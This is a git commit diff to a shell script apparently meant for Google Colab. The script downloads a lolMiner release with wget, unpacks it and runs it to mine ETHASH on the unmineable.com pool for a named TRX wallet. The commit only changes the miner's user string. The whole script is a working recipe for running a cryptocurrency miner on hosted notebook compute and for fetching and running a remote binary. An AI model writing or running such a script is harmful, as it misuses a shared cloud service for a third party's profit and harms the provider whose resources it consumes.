3f4c005e7cfc47abf993b0b5355bfbb26ba90e86
juggernaut <93597297+nop3g@users.noreply.github.com>
2022-04-16 13:03:00 +0400

    Update gcolab-us.sh

--- gcolab-us.sh
+++ gcolab-us.sh
@@ -10,4 +10,4 @@ screen -R xmr
 wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.48/lolMiner_v1.48_Lin64.tar.gz
 tar xvzf lolMiner_v1.48_Lin64.tar.gz
 cd 1.48
-./lolMiner  --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TBom3chnoWAncM7QHMa4mMGZMhCJtaNy3w:Colab --ethstratum ETHPROXY pause 
+./lolMiner  --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TBom3chnoWAncM7QHMa4mMGZMhCJtaNy3w:Colab:x --ethstratum ETHPROXY pause 
